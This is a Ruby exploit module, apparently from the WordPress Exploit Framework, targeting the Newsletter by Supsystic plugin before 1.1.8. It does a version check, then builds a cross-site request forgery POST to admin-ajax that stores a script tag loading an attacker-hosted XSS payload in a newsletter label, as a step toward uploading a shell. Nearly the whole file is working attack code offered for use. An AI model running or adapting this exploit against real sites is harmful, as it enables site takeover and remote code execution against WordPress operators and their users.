# frozen_string_literal: true

class Wpxf::Exploit::NewsletterBySupsysticCsrfStoredXssShellUpload < Wpxf::Module
  include Wpxf::WordPress::StagedReflectedXss

  def initialize
    super

    update_info(
      name: 'Newsletter by Supsystic < 1.1.8 CSRF Stored XSS Shell Upload',
      author: [
        'King Coder', # Disclosure
        'rastating'   # WPXF module
      ],
      references: [
        ['WPVDB', '8832'],
        ['URL', 'https://www.vulnerability-lab.com/get_content.php?id=2070']
      ],
      date: 'May 23 2017'
    )
  end

  def check
    check_plugin_version_from_readme('newsletter-by-supsystic', '1.1.8')
  end

  def vulnerable_url
    wordpress_url_admin_ajax
  end

  def initial_script
    create_basic_post_script(
      vulnerable_url,
      'action'  => 'create',
      'label'   => "#{Utility::Text.rand_alpha(10)}<script src=\\\"#{xss_url}\\\"><\\/script>",
      'slid[]'  => '1',
      'oid'     => '1',
      'mod'     => 'newsletters',
      'pl'      => 'nbs',
      'reqType' => 'ajax'
    )
  end
end
